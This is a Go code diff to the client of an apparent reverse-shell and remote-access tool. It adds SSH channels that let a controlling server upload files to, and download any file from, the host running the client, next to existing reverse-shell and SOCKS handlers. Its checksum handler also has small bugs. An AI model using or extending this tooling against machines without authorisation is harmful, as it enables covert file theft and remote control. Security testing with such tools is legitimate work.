@@ -6,12 +6,14 @@ import (
 	"encoding/json"
 	"flag"
 	"fmt"
+	"io"
 	"net/http"
 	"os"
 	"os/exec"
 	"slices"
 	"slider/pkg/interpreter"
 	"slider/pkg/sconn"
+	"slider/pkg/sio"
 	"slider/pkg/slog"
 	"slider/pkg/ssocks"
 	"time"
@@ -120,7 +122,14 @@ func (c *client) handleGlobalChannels(newChan <-chan ssh.NewChannel) {
 	for nc := range newChan {
 		switch nc.ChannelType() {
 		case "socks5":
+			c.Debugf("Opening \"%s\" channel", nc.ChannelType())
 			go c.handleSocksChannel(nc)
+		case "file-upload":
+			c.Debugf("Opening \"%s\" channel", nc.ChannelType())
+			go c.handleFileUploadChannel(nc)
+		case "file-download":
+			c.Debugf("Opening \"%s\" channel", nc.ChannelType())
+			go c.handleFileDownloadChannel(nc)
 		default:
 			c.Debugf("Rejected channel %s", nc.ChannelType())
 			if rErr := nc.Reject(ssh.UnknownChannelType, ""); rErr != nil {
@@ -129,7 +138,6 @@ func (c *client) handleGlobalChannels(newChan <-chan ssh.NewChannel) {
 					rErr,
 				)
 			}
-			return
 		}
 	}
 }
@@ -145,6 +153,7 @@ func (c *client) handleGlobalRequests(requests <-chan *ssh.Request) {
 			c.Debugf("Received \"%s\" Connection Request", req.Type)
 			go c.sendCommandExec(req)
 		case "session-shell":
+			c.Debugf("Received \"%s\" Connection Request", req.Type)
 			go c.sendReverseShell(req)
 		case "window-change":
 			// Server only sends this Request if Interpreter is PTY
@@ -155,16 +164,8 @@ func (c *client) handleGlobalRequests(requests <-chan *ssh.Request) {
 				c.Fatalf("%s", err)
 			}
 			c.updatePtySize(termSize.Rows, termSize.Cols)
-		case "socks5-stop":
-			c.Debugf("Server Requested SOCKS shutdown")
-			_ = req.Reply(true, nil)
-			/*
-				if c.socksInstance.IsEnabled() {
-					if sErr := c.socksInstance.Stop(); sErr != nil {
-						c.Errorf("%s", sErr)
-					}
-				}
-			*/
+		case "checksum-verify":
+			go c.verifyFileCheckSum(req)
 		case "disconnect":
 			c.Debugf("Server requested Client disconnection.")
 			_ = c.replyConnRequest(req, true, []byte("disconnected"))
@@ -243,12 +244,12 @@ func (c *client) sendSessionRequest(sshSession *ssh.Session, requestType string,
 	return nil
 }
 
-func (c *client) handleSocksChannel(newChan ssh.NewChannel) {
-	socksChan, req, aErr := newChan.Accept()
+func (c *client) handleSocksChannel(channel ssh.NewChannel) {
+	socksChan, req, aErr := channel.Accept()
 	if aErr != nil {
 		c.Errorf(
 			"Failed to accept \"%s\" channel.\n%s",
-			newChan.ChannelType(),
+			channel.ChannelType(),
 			aErr,
 		)
 		return
@@ -266,4 +267,71 @@ func (c *client) handleSocksChannel(newChan ssh.NewChannel) {
 	if err := c.socksInstance.StartServer(); err != nil {
 		c.Debugf("SOCKS - %s", err)
 	}
+}
+
+func (c *client) handleFileUploadChannel(channel ssh.NewChannel) {
+	uploadChan, requests, aErr := channel.Accept()
+	if aErr != nil {
+		c.Errorf(
+			"Failed to accept \"%s\" channel.\n%s",
+			channel.ChannelType(),
+			aErr,
+		)
+		return
+	}
+	defer func() { _ = uploadChan.Close() }()
+
+	go ssh.DiscardRequests(requests)
+
+	filePath := string(channel.ExtraData())
+
+	file, fErr := os.OpenFile(filePath, os.O_RDWR|os.O_CREATE, 0644)
+	defer func() { _ = file.Close() }()
+	if fErr == nil {
+		_, _ = io.Copy(file, uploadChan)
+	}
+}
+
+func (c *client) verifyFileCheckSum(req *ssh.Request) {
+	var fileInfo sio.FileInfo
+	c.Debugf("Received \"%s\" Connection Request", req.Type)
+	if err := json.Unmarshal(req.Payload, &fileInfo); err != nil {
+		_ = req.Reply(false, []byte("failed to unmarshal file info"))
+	}
+
+	_, checkSum, cErr := sio.ReadFile(fileInfo.FileName)
+	if cErr != nil {
+		_ = req.Reply(false, []byte(fmt.Sprintf("could not read file %s", fileInfo.FileName)))
+	}
+
+	if checkSum != fileInfo.CheckSum {
+		_ = req.Reply(false, []byte(fmt.Sprintf(
+			"checksum of src (%s) differs from dst (%s)",
+			fileInfo.CheckSum, checkSum)))
+	}
+	_ = req.Reply(true, nil)
+}
+
+func (c *client) handleFileDownloadChannel(channel ssh.NewChannel) {
+	downloadChan, _, aErr := channel.Accept()
+	if aErr != nil {
+		c.Errorf(
+			"Failed to accept \"%s\" channel.\n%s",
+			channel.ChannelType(),
+			aErr,
+		)
+		return
+	}
+	defer func() { _ = downloadChan.Close() }()
+
+	srcFile := string(channel.ExtraData())
+	file, checkSum, fErr := sio.ReadFile(srcFile)
+	if fErr != nil {
+		// Rejecting the Reply will tell the server the payload is an error
+		_, _ = downloadChan.SendRequest("checksum", false, []byte(fmt.Sprintf("%s", fErr)))
+	}
+	// If the File was read Successfully we will send its CheckSum as Payload
+	_, _ = downloadChan.SendRequest("checksum", true, []byte(checkSum))
+	// Copy file over channel
+	_, _ = downloadChan.Write(file)
 }
